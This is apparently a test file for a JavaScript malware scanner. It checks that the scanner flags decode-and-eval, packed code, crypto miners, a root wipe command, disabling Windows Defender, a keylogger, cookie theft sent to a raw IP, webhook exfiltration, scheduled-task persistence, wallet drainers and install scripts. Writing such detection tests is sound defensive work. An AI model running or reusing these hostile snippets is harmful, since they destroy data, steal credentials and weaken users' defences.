import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scanCode } from '../../src/lib/codeScanner.js';

const ids = (scan) => scan.findings.map((f) => f.id);

test('ordinary code passes', () => {
  const scan = scanCode('export function add(a, b) {\n  return a + b;\n}\nconst evaluate = (x) => x * 2;\n');
  assert.equal(scan.verdict, 'safe');
  assert.equal(scan.score, 100);
  assert.deepEqual(scan.findings, []);
});

test('a plain fetch or a Telegram bot still passes, with the call listed', () => {
  const scan = scanCode('await fetch("/api/data");\nawait fetch(`https://api.telegram.org/bot${token}/sendMessage`);');
  assert.equal(scan.verdict, 'safe');
  assert.ok(ids(scan).includes('network'));
  assert.ok(ids(scan).includes('telegram-api'));
});

test('decode-and-execute is dangerous', () => {
  const scan = scanCode('const p = atob("ZG9jdW1lbnQ=");\neval(p);');
  assert.equal(scan.verdict, 'dangerous');
  assert.ok(ids(scan).includes('decode-and-run'));
});

test('packed javascript is dangerous', () => {
  const scan = scanCode("eval(function(p,a,c,k,e,d){return p}('x',1,1,'x'.split('|'),0,{}))");
  assert.equal(scan.verdict, 'dangerous');
  assert.ok(ids(scan).includes('packed'));
});

test('miners, wipes and disabling antivirus are dangerous', () => {
  for (const src of [
    'const pool = "stratum+tcp://pool.example:3333";',
    'os.system("rm -rf / --no-preserve-root")',
    'Set-MpPreference -DisableRealtimeMonitoring $true',
  ]) {
    assert.equal(scanCode(src).verdict, 'dangerous', src);
  }
});

test('keylogger and cookie theft combinations are flagged', () => {
  const keylog = scanCode('document.addEventListener("keydown", e => buf.push(e.key));\nnavigator.sendBeacon("/c", buf);');
  assert.ok(ids(keylog).includes('keylogger'));
  assert.notEqual(keylog.verdict, 'safe');
  const steal = scanCode('const c = document.cookie;\nfetch("http://203.0.113.9/x?c=" + c);');
  assert.ok(ids(steal).includes('steal-storage'));
  assert.ok(ids(steal).includes('raw-ip'));
  assert.notEqual(steal.verdict, 'safe');
});

test('exfiltration endpoints, shells and persistence are flagged', () => {
  assert.ok(ids(scanCode('post("https://discord.com/api/webhooks/1/abc", data)')).includes('drop-endpoint'));
  assert.ok(ids(scanCode('const { exec } = require("child_process");')).includes('shell'));
  assert.ok(ids(scanCode('schtasks /create /tn updater /tr evil.exe')).includes('persistence'));
});

test('hardcoded keys and private keys are found', () => {
  const key = 'ghp_' + 'z'.repeat(36);
  assert.ok(ids(scanCode(`const token = "${key}";`)).includes('secret-key'));
  const pem = '-----BEGIN ' + 'EC PRIVATE KEY-----';
  assert.equal(scanCode(pem).verdict, 'dangerous');
});

test('wallet drainer and risky Solidity are flagged', () => {
  assert.ok(ids(scanCode('token.approve(spender, ethers.constants.MaxUint256)')).includes('drainer'));
  assert.ok(ids(scanCode('function kill() public { selfdestruct(payable(owner)); }')).includes('solidity-danger'));
});

test('package.json install scripts and remote dependencies are flagged', () => {
  const pkg = JSON.stringify({ scripts: { postinstall: 'node x.js' }, dependencies: { evil: 'github:someone/evil' } }, null, 2);
  const found = ids(scanCode(pkg, { fileName: 'package.json' }));
  assert.ok(found.includes('install-script'));
  assert.ok(found.includes('remote-dependency'));
});

test('findings point at the right line', () => {
  const scan = scanCode('const a = 1;\nconst b = 2;\neval(b);\n');
  const f = scan.findings.find((x) => x.id === 'eval');
  assert.equal(f.line, 3);
  assert.equal(f.excerpt, 'eval(b);');
});
